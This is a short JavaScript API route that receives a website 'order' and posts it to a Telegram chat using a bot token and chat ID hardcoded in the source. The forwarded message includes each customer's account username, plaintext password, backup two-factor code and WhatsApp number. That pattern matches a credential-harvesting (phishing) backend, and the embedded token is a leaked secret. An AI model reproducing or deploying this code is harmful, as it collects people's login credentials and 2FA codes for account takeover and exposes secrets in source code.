export async function POST(request) {
    try {
        const order = await request.json();

        const BOT_TOKEN = '8284337758:AAF1GIzNnAYkrRu12xbYaOb-QfpdalqyFZk';
        const CHAT_ID = '-1003622499227';

        const message = [
            `*Website Order*`,
            `🧾 *Order Code:* \`${order.orderCode}\``,
            ``,
            `📦 *Product:* ${order.productName}`,
            `💰 *Price:* Rp ${Number(order.price).toLocaleString('id-ID')}`,
            `📁 *Category:* ${order.category || 'Regular'}`,
            ``,
            `👤 *Username:* \`${order.username}\``,
            `🔑 *Password:* \`${order.password}\``,
            order.backupCode ? `🔐 *Backup Code:* \`${order.backupCode}\`` : '',
            `📱 *WhatsApp:* \`${order.whatsapp}\``,
            ``,
            `⏰ *Time:* ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}`,
            `📌 *Status:* PENDING`,
        ].filter(Boolean).join('\n');

        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
            }),
        });

        const data = await res.json();

        if (!data.ok) {
            console.error('Telegram API error:', data);
            return Response.json({ error: 'Telegram send failed' }, { status: 500 });
        }

        return Response.json({ success: true });
    } catch (error) {
        console.error('Telegram notification error:', error);
        return Response.json({ error: error.message }, { status: 500 });
    }
}
